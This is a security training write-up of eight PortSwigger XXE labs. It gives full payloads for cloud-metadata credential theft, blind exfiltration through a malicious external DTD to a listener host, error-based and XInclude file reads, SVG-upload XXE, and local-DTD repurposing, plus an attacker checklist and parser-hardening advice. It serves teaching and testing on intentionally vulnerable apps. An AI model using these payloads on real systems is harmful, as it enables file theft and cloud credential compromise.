# XXE Injection: Lab Writeup, Architecture Analysis & Attacker Methodology

## 1. Background: what XXE actually is

XML parsers that process a `DOCTYPE` declaration support **entities** — reusable placeholders defined once and referenced elsewhere in a document. The XML 1.0 spec allows two dangerous entity types:

- **General external entities**, declared with `<!ENTITY name SYSTEM "URI">` and referenced as `&name;` inside the document body.
- **Parameter entities**, declared with `<!ENTITY % name SYSTEM "URI">` and referenced as `%name;`, but only *inside the DTD itself* (internal or external subset) — never in the document body.

When a parser resolves a `SYSTEM` identifier, it fetches whatever that URI points to — a local file (`file://`), an internal service (`http://`), or a network share — and substitutes the result as if it were literal XML content. XXE (**XML External Entity injection**) is what happens when an application accepts attacker-controlled XML and its parser is configured to resolve these external references. The vulnerability class sits at **OWASP Top 10 A05 (Security Misconfiguration)** territory conceptually, though it's usually filed under injection — the misconfiguration is "DTD processing is enabled by default."

The four labs in your notes are a clean progression through the standard exploitation ladder for this bug class: **direct SSRF → OOB confirmation → parameter-entity bypass → external-DTD data exfiltration**. Below is a cleaned-up writeup of each, followed by how each step maps onto real production systems, then reconstructed payloads for open, self-hosted labs like Juice Shop, and finally an attacker's methodology checklist.

---

## 2. Lab-by-lab writeup

### Lab 1 — Exploiting XXE to perform SSRF (cloud metadata theft)

**Vulnerable surface:** a `/product/stock` endpoint that accepts `application/xml` and parses the `productId` value out of the body — a classic case of a "boring" internal API silently trusting XML input.

**Mechanism:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
The parser resolves `&xxe;` by making an **outbound HTTP request from the server itself** to the cloud metadata service, then splices the response body into the `productId` field. Because the application echoes the (invalid) product ID back in its error message, the SSRF becomes fully readable — the classic "in-band" XXE.

The walk to the credentials endpoint is iterative: you request the metadata root first (returns a directory listing as plain text), then descend path by path (`/latest/meta-data/`, `/iam/`, `/security-credentials/`, finally `/admin`) until you land on a JSON blob containing `AccessKeyId`, `SecretAccessKey`, and a session `Token`.

**Why this matters beyond the lab:** this is IMDSv1 — the metadata service will hand out temporary IAM credentials to *any* request that reaches it, with no authentication, because the assumption baked into the design is "only code running on this instance can reach 169.254.169.254." XXE (and other SSRF primitives) break that assumption by turning the vulnerable web server into a proxy that reaches the metadata endpoint on the attacker's behalf.

### Lab 2 — Blind XXE with out-of-band (OOB) interaction

**Vulnerable surface:** same stock-check feature, but this time the response doesn't reflect anything — no error message, no data in the body. In-band exfiltration is dead in the water, so you need a side channel.

**Mechanism:**
```xml
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://YOUR-OOB-SERVER"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
The parser still resolves the entity and fetches the URL — you just can't see the response. Instead, you observe the *side effect*: your OOB listener (Burp Collaborator, or a self-hosted equivalent — see §4) logs a DNS lookup followed by an HTTP GET, proving the server-side parser dereferenced your external entity. This is the "existence proof" step: confirm the primitive works before building anything more elaborate on top of it.

### Lab 3 — Blind XXE via XML parameter entities

**Vulnerable surface:** same feature, but this time the application (or an intermediary WAF/library) **blocks regular external entity declarations** — the request gets rejected if it sees `<!ENTITY xxe SYSTEM ...>` referenced as `&xxe;` in the body.

**Mechanism:**
```xml
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://YOUR-OOB-SERVER"> %xxe; ]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
This swaps to a **parameter entity** (`%xxe`) instead of a general entity (`&xxe`). Parameter entities are evaluated *inside the DTD itself*, at the point `%xxe;` appears — you don't even need to reference it in the document body, and the `productId` value can go back to being a legitimate number. Many naive filters only pattern-match on `<!ENTITY name SYSTEM` followed later by `&name;` in the body; they miss the parameter-entity form entirely, because the exploitation and the "payload delivery" both live inside the DTD, invisible to body-content filtering.

### Lab 4 — Blind XXE data exfiltration via a malicious external DTD

**Vulnerable surface:** same feature, output fully blind, and this time the goal is to actually **read a file off the server's disk** (`/etc/hostname`) rather than just prove OOB connectivity.

**This is the part you flagged as confusing, so here's the mechanism in detail.**

The naive approach would be to try this directly in the request's own DOCTYPE:

```xml
<!DOCTYPE test [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SERVER/?x=%file;'>">
  %eval;
  %exfil;
]>
```

**This fails when placed directly in the internal DTD subset** (the `[...]` inside the request's own `<!DOCTYPE>`). The XML specification imposes a well-formedness constraint: a parameter entity reference is **not allowed to appear within a markup declaration in the internal DTD subset** except as the entirety of that declaration. In plain terms — you can't use `%file;` to help *construct* a brand-new `<!ENTITY ...>` declaration (as `%eval` tries to do) while you're still inside the internal subset. The parser will refuse to parse it.

The external DTD subset has no such restriction. So the trick is a **two-stage indirection**:

1. Host a malicious `.dtd` file somewhere the target server can reach (an "exploit server" in the lab, or any HTTP server you control in a real test).
2. That external file contains the three-entity chain:
   ```xml
   <!ENTITY % file SYSTEM "file:///etc/hostname">
   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SERVER/?x=%file;'>">
   %eval;
   %exfil;
   ```
3. The actual request to the vulnerable endpoint just does one thing — pull in that external DTD via a parameter entity:
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://YOUR-EXPLOIT-SERVER/malicious.dtd"> %xxe;]>
   <stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
   ```

Walking through what happens when the target parses this:
- `%xxe;` in the internal subset is a **bare parameter-entity reference on its own line** — that's the one form the well-formedness rule *does* allow inside the internal subset — so the parser fetches and inlines the external DTD.
- Once the parser is executing inside the **external** subset (your malicious DTD file), the restriction is lifted. `%file` is defined and immediately available.
- `%eval` is defined as literal text that, when expanded, forms a brand-new entity declaration — `<!ENTITY % exfil SYSTEM '...?x=%file;'>` — but note `&#x25;` is used instead of a literal `%` inside that string. This is necessary because a literal `%` inside an entity's *replacement text* would itself be interpreted as the start of another parameter-entity reference immediately, before `%eval` is even fully defined — `&#x25;` is the numeric character reference for `%`, so it passes through as inert text until `%eval;` is invoked and the string is re-parsed as a declaration.
- `%eval;` is invoked → the parser parses that string as an actual `<!ENTITY % exfil ...>` declaration, at which point `%file` has already been substituted with the *contents of `/etc/hostname`*, becoming part of the exfil entity's URL.
- `%exfil;` is invoked → the parser makes an outbound request to `http://YOUR-SERVER/?x=<contents-of-hostname>` — and your listener logs the file contents in the query string.

So the two-DTD structure isn't stylistic — it's the only way around a specific parser-enforced grammar rule that blocks parameter entities from building new entity declarations inside the internal subset. This is precisely why "regular" file-read XXE (Lab 1's technique, just swapping the URL to `file:///etc/hostname`) doesn't work for *blind* exfiltration of arbitrary files: reading a file back in-band is fine when the file has no `%`, `&`, `<`, or `>` characters and the app echoes the parse error, but you need the external-DTD trick the moment you have to smuggle the read data out through a URL and the response is invisible to you.

### Lab 5 — Exploiting blind XXE to retrieve data via error messages

**Vulnerable surface:** the same blind stock-check endpoint (no reflected content, no visible parse errors surfaced to the user under normal circumstances) — except this time the goal is to force the parser itself to leak file contents *inside its own error output*, without needing an OOB channel at all.

**Mechanism:** host a malicious external DTD, but instead of exfiltrating over HTTP, deliberately cause the parser to fail while a file's contents are embedded in the failing path:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

Trigger it from the injection point the same way as Lab 4 — a bare parameter-entity reference to the hosted DTD:
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```

The chain resolves exactly like Lab 4 up through `%exfil`, but here `%exfil`'s `SYSTEM` value is `file:///invalid/<contents-of-passwd>` — a deliberately non-existent path. When the parser tries to open it and fails, it throws a `FileNotFoundException` whose message string contains the full path it tried to open — which is `/invalid/` followed by the entire contents of `/etc/passwd`. Because the application returns raw parser exceptions in its `400 Bad Request` body (a debugging/verbosity misconfiguration, common when stack traces aren't stripped in error handlers), that exception text — and the stolen file — ends up directly in the HTTP response.

**Key takeaways:**
- This is a **third distinct exfiltration channel** beyond in-band reflection (Lab 1) and OOB (Labs 2–4): forcing a parse *error* to carry the payload. It requires zero outbound network access from the target and no listener infrastructure — only a verbose error handler on the target side.
- The technique only works because the target throws the file path itself back to the client; if error messages were generic ("Invalid request") this vector is closed even though the underlying XXE primitive still exists — a good illustration of why **defense in depth** (both disabling DTDs *and* sanitizing error output) matters more than fixing just one layer.
- Same well-formedness constraint from Lab 4 applies here: this still has to be built via an external DTD, since the `%eval`/`%exfil` construction pattern can't live in the internal subset.

### Lab 6 — Exploiting XInclude to retrieve files

**Vulnerable surface:** an endpoint that embeds part of the user-supplied value into a **server-side XML document that already exists** — you never control the full document, and typically can't inject a `<!DOCTYPE>` at all, only a fragment of the data itself. `DOCTYPE`-based XXE is unavailable in this scenario, but the injection point still lands inside XML.

**Mechanism:** [XInclude](https://www.w3.org/TR/xinclude/) is a separate W3C XML mechanism (not DTD/entity-based) that lets one XML document pull in another by reference, using the `http://www.w3.org/2001/XInclude` namespace:

```xml
<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="/etc/passwd" parse="text"/>
```

Since this doesn't require declaring a `DOCTYPE`, it works even in contexts where the application builds its own outer XML wrapper around your input and only your fragment is attacker-controlled — exactly the "targeted scan" scenario the Burp scanner flagged, where the original probe used `xi:include` with an `href` pointing at Collaborator to prove the parser resolves it, before swapping the `href` to a local file path with `parse="text"` to pull the file back as plain text into the response.

Delivery note from the request: the payload was URL-encoded and sent as a standard form field (`productId=%3c%78...`) rather than a raw `application/xml` body — a reminder that the same injection often has multiple valid encodings/delivery contexts once you understand *where* in the document your input lands.

**Key takeaways:**
- XXE isn't only a `<!DOCTYPE>`/entity problem — **XInclude is a second, independent XML extension point** capable of the same file-read impact, and it survives in situations where entity declarations are stripped or a fixed DTD is enforced upstream (since XInclude doesn't touch the DTD at all).
- Any XML parser configuration audit needs to check *both* "is DTD processing disabled" *and* "is XInclude processing disabled" — they're separate feature flags in most parser libraries (e.g., in Java, `XMLInputFactory.SUPPORT_DTD` vs. enabling XInclude explicitly via `setXIncludeAware(true)`), so hardening one doesn't automatically close the other.
- This is the vector to reach for when you only control a fragment/attribute value inside a larger, otherwise-fixed server-side XML document, not the full request body.

### Lab 7 — Exploiting XXE via image file upload

**Vulnerable surface:** an image upload feature that accepts SVG files. SVG is XML under the hood (`<svg xmlns="http://www.w3.org/2000/svg">...`), so any handler that parses it (to validate it, sanitize it, or just render it as an image) is a full XML parser sitting behind what looks like a harmless "upload your avatar" feature.

**Mechanism:** craft the "image" as a valid SVG document with an embedded DOCTYPE and entity, then render the entity's value as visible text inside the image:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

Uploading this and then viewing the rendered/served image causes the target's SVG parser to resolve `&xxe;` and literally draw the file's contents as text on the image — an in-band read with the browser/image-viewer itself as the exfiltration display.

**Key takeaways:**
- **File-upload features are a very common, easily-missed XXE surface** because the developer's mental model is "image upload," not "XML parser exposed to the internet" — SVG, and to a lesser extent other XML-based image/vector formats, blur that line completely.
- This is an **in-band** technique (you directly see the result by viewing the processed file), so it's often the fastest XXE to confirm and demonstrate impact from, when it's available — no OOB infrastructure needed.
- Real-world mitigation is usually format-level: strip or reject `<!DOCTYPE>` declarations during SVG sanitization (most SVG-sanitizer libraries, e.g. DOMPurify's SVG profile, do this by default), or rasterize/re-encode uploaded images server-side rather than serving the original file back, which destroys any embedded XML trickery in the process.

### Lab 8 — Exploiting XXE to retrieve data by repurposing a local DTD

**Vulnerable surface:** the classic blind stock-check endpoint again, but this time **outbound network access from the server is blocked entirely** — no DNS, no HTTP egress — so neither the OOB technique (Labs 2–3) nor the external-DTD-over-HTTP technique (Labs 4–5) can reach anything. The exfiltration payload has to be built entirely from resources already present on the local filesystem.

**Mechanism:** many Linux systems ship pre-installed DTD files as part of desktop/documentation packages (the lab points at GNOME's Yelp help viewer, which installs `/usr/share/yelp/dtd/docbookx.dtd`). These DTDs declare a set of standard entities for their own internal use — the trick is to **import a real, local DTD via `file://`, then redefine one of its existing entity names** with your own malicious replacement text before the parser gets to the "real" definition:

```xml
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

Because parameter entities in DTDs follow "first definition wins," redefining `ISOamso` *before* `%local_dtd;` is invoked means that when the Yelp DTD itself later tries to define `ISOamso` internally, that later definition is simply ignored — your version, containing the full `%file`/`%eval`/`%error` chain from Lab 5, is what actually gets used at that point in the DTD, triggering the same error-based file leak entirely offline. Note the extra layer of entity-encoding here (`&#x26;#x25;` for a literal `&#x25;` inside the *already-encoded* replacement text) — each level of nested entity substitution needs its own escaping so the special characters survive being re-parsed multiple times before finally resolving.

**Key takeaways:**
- This defeats a very common (and otherwise effective) mitigation: **network-level egress filtering** on the application server. If the server truly has zero outbound access, both OOB and hosted-external-DTD techniques are dead — but **any locally-readable DTD file becomes a substitute "external" resource**, since `file://` access to disk was never blocked, just the network.
- The technique depends on knowing (or guessing) DTD file paths that exist on the target's OS/software stack — this is effectively a small fingerprinting exercise (GNOME/Yelp, but also things like `/usr/share/xml/`, certain Java runtime-bundled DTDs, or DTDs shipped with other installed packages) rather than a universal payload.
- **True defense requires disabling DTD processing outright**, not just blocking egress — as long as the parser will resolve *any* `SYSTEM` identifier (local or remote) and process entity redefinition, a sufficiently resourceful attacker can route around network controls using what's already on disk.

---

## 3. How this maps onto real-world server architectures

These four labs aren't academic corner cases — they mirror four separate categories of real production exposure:

**a. Document- and office-format ingestion pipelines.** `.docx`, `.xlsx`, `.pptx`, `.odt`, and `.svg` are all ZIP archives (or plain files) containing XML internally. Any backend that parses uploaded documents to extract text, generate thumbnails, or validate structure — resume parsers, invoice processors, CMS import tools, image-conversion services handling SVG — is a candidate XXE surface if it hands the extracted XML straight to a DOM/SAX parser with external entity resolution left at its (often insecure) library default.

**b. SOAP, XML-RPC, and legacy B2B/EDI integrations.** Many enterprise integration layers (banking, healthcare HL7/CDA, logistics EDI-over-XML, older SOAP web services) still exchange raw XML between organizations. These endpoints are frequently older code that predates security-hardened parser defaults and rarely gets re-audited once "it just works."

**c. SAML authentication flows.** SAML assertions are XML. A misconfigured Service Provider that parses an attacker-supplied SAML response with DTD processing enabled is a well-documented real-world XXE vector, sometimes chained into full authentication bypass, not just SSRF/file-read.

**d. Cloud metadata SSRF as a *second-order* impact.** Lab 1 specifically demonstrates why SSRF (however it's achieved — XXE, unvalidated redirect-following, image-fetch proxies, PDF generators, webhooks) is treated as critical in cloud environments: it turns "read an internal HTTP endpoint" into "steal IAM credentials with the permissions of whatever role is attached to the instance/container." Real cloud providers have hardened this specific path:
   - **AWS IMDSv2** requires a `PUT` request with a custom header (`X-aws-ec2-metadata-token`) to obtain a session token before any `GET` to the metadata service will succeed, and by default rejects requests with a TTL/hop-limit that most SSRF primitives (which can only issue simple GETs) can't satisfy.
   - **GCP** requires the `Metadata-Flavor: Google` header on metadata requests.
   - **Azure IMDS** requires the `Metadata: true` header.
   All three exist specifically because bugs like this lab's exact scenario were common enough in the wild to justify a platform-level fix — a simple `SYSTEM "http://169.254.169.254/..."` with no custom headers, as used in the lab, is now blocked by default on a properly configured IMDSv2-only instance. This is worth knowing: in a real pentest, a "no data back" result from hitting the metadata IP doesn't mean SSRF is unexploitable, it may mean IMDSv2 is enforced and you need a primitive capable of setting custom headers (rare for XXE, more common for other SSRF vectors).

**e. Air-gapped or egress-filtered environments.** Lab 8 matters for pentests against hardened targets specifically because "we block outbound traffic from app servers" is a common, genuinely effective SSRF mitigation that teams over-rely on — repurposing a locally-installed DTD shows that egress filtering alone doesn't neutralize XXE if DTD/entity processing itself is still enabled.

**f. Denial of service via entity expansion.** Not exercised in these labs, but the same DTD machinery enables "billion laughs" attacks — nested entities that expand exponentially in memory, a resource-exhaustion DoS against the parser itself. Worth mentioning in a writeup because it's the same root cause (DTD processing left on) with a different impact.

---

## 4. Reconstructed payloads for self-hosted / open dynamic labs (Juice Shop, DVWA, WebGoat)

Two adjustments are needed to reuse these payloads outside PortSwigger Academy: (1) you won't have Burp Collaborator's managed OOB infrastructure unless you're running Burp Pro, so substitute a self-controlled listener; (2) the vulnerable endpoint and parser will differ by lab.

**OOB listener alternatives** (any of these give you the same "did my entity get resolved" signal Collaborator gives you):
- **interactsh** (open-source, self-hostable or via the public `oast.pro`/`oast.live` instances that ship with the `interactsh-client` CLI)
- A `python3 -m http.server` or `nc -lvnp 80` box you control, reachable from the lab container, if the lab runs alongside your attacking machine on the same Docker network or a routable IP
- `requestbin`-style services for HTTP-only confirmation (won't catch DNS-only interactions)

**OWASP Juice Shop specifically:** Juice Shop's XXE category centers on its file-upload feature (the "complaint"/file submission flow), which parses uploaded XML content server-side using `libxmljs`. The relevant challenges generally require uploading a crafted `.xml` (or an XML file smuggled inside a `.zip`, since the upload handler also unpacks archives) rather than sending a raw `application/xml` POST body like the PortSwigger labs. Because Juice Shop's exact upload validation and challenge set changes between versions, treat the payload shapes below as the *technique*, and adapt the delivery mechanism (form file upload vs. raw request body) to whatever the running version accepts — check the app's own hint system for the current file-upload path before assuming it matches an older walkthrough you might find online.

Generic, delivery-agnostic templates:

```xml
<!-- 1. Direct/in-band read (works if the app echoes parsed content back) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<data>&xxe;</data>
```

```xml
<!-- 2. Blind OOB existence check -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [ <!ENTITY xxe SYSTEM "http://YOUR-INTERACTSH-ID.oast.live"> ]>
<data>&xxe;</data>
```

```xml
<!-- 3. Parameter-entity form, for when general entities are filtered -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [<!ENTITY % xxe SYSTEM "http://YOUR-INTERACTSH-ID.oast.live"> %xxe; ]>
<data>test</data>
```

```dtd
<!-- 4. malicious.dtd — host this on any HTTP server you control -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-INTERACTSH-ID.oast.live/?x=%file;'>">
%eval;
%exfil;
```
*(Note the `php://filter` wrapper swap on a PHP-backed target — this base64-encodes the file first, which matters because the raw contents of many real files contain characters like `&`, `<`, or newlines that break the URL/XML the moment they're substituted unescaped. For a Node.js target like Juice Shop, `php://` wrappers don't apply — a plain `file://` path is the right choice, and you should target small, character-safe files first, e.g. `/etc/hostname`, before attempting anything with special characters.)*

```xml
<!-- 5. Triggering the external DTD from the actual injection point -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR-HOSTED-DTD-SERVER/malicious.dtd"> %xxe;]>
<data>test</data>
```

---

## 5. Attacker-perspective methodology & recommendations

**Recon — finding candidate surfaces:**
- Any endpoint accepting `Content-Type: application/xml`, `text/xml`, or SOAP `Content-Type: application/soap+xml`
- File upload features accepting `.docx/.xlsx/.pptx/.odt/.svg/.xml/.rss/.kml/.gpx` — these are XML under the hood even when the app doesn't advertise "XML" anywhere in its UI
- Endpoints that *look* JSON-only but silently also accept XML — try changing `Content-Type` to `application/xml` and re-sending a hand-crafted XML body even if the docs never mention it
- SAML SSO login flows (inspect the `SAMLResponse` POST parameter)

**Exploitation order (cheapest signal first):**
1. Try in-band read (`file://` or internal `http://` SYSTEM value referenced with `&xxe;`) — fastest confirmation if the app reflects any parsed data or errors.
2. If blind, confirm the primitive exists with an OOB ping before building anything more complex.
3. If general entities get filtered/blocked, retry with the parameter-entity form.
4. For actual data exfiltration when blind, stand up an external DTD and use the `%file/%eval/%exfil` chain; base64-encode file reads to survive characters that would otherwise break the XML/URL.
5. If none of the above resolves, check for **error-based XXE** — some parsers surface the *file path itself* (not full contents) in a verbose parse-error message when a `SYSTEM` reference fails to resolve as valid XML; deliberately pointing at a non-XML file and reading the resulting error string is a known variant that needs no OOB channel at all.

**Defensive callouts worth noting in a report (shows you understand both sides):**
- The actual fix is disabling DTD processing / external entity resolution entirely at the parser level (e.g., Java: `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`; .NET: `XmlResolver = null` since Framework 4.5.2+ defaults are already safe; libxml2-based stacks: don't pass `LIBXML_NOENT` / `LIBXML_DTDLOAD`; Python `lxml`: `resolve_entities=False`).
- Allow-listing input formats (reject XML entirely on endpoints that only need JSON) closes off surfaces that shouldn't have existed at all.
- IMDSv2 enforcement, egress filtering on outbound requests from app servers, and least-privilege IAM roles all reduce blast radius even if an XXE/SSRF slips through.

---

**Sources of the four techniques above:** these correspond directly to PortSwigger's Web Security Academy XXE lab series (publicly documented, free-tier labs designed for this exact kind of practice) and OWASP Juice Shop's own "XML External Entities (XXE)" challenge category, both intentionally vulnerable applications built for this purpose.
